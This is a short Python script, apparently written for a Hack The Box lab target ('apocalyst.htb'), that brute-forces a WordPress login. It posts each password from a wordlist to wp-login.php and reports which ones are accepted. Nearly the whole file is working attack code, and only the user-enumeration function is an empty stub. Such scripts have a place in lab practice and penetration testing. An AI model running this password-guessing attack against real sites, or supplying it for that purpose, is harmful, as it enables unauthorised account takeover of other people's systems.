import requests
import re
import sys
from termcolor import colored, cprint



def brute_force_passwords(user, wordlist, url, verbose):
    cprint('Go, Dark Shadow!\n', 'magenta', attrs=['bold'])
    s = requests.Session()
    #url = "http://apocalyst.htb/wp-login.php"
    r = s.get(url)
    cookies = dict(r.cookies)
    with open(wordlist) as f:
        match_count = 0
        for passwd in f:
            passwd = passwd.strip()
            payload = {'log': user, 
                        'pwd': passwd, 
                        'wp-submit': 'Log+In', 
                        'redirect_to': 'http://apocalyst.htb/wp-admin/',
                        'testcookie': '1'}
            r = s.post(url, data=payload, cookies=cookies)
            check_regex = re.compile("incorrect")
            fail = check_regex.search(r.text)
            if fail:
                cprint(passwd, 'red')
            else:
                cprint('Access Granted for password ',  'green', end='')
                cprint(passwd, 'green', attrs=['reverse'])
                match_count+=1
                if verbose is not True:
                    sys.exit()
                else:
                    continue
        if match_count == 0:
            cprint(f'No valid login found for {user} in {wordlist}', 'yellow')
        else:
            cprint(f'{str(match_count)} match(es) found. Refer to the above', 'green')

def brute_force_users():
    pass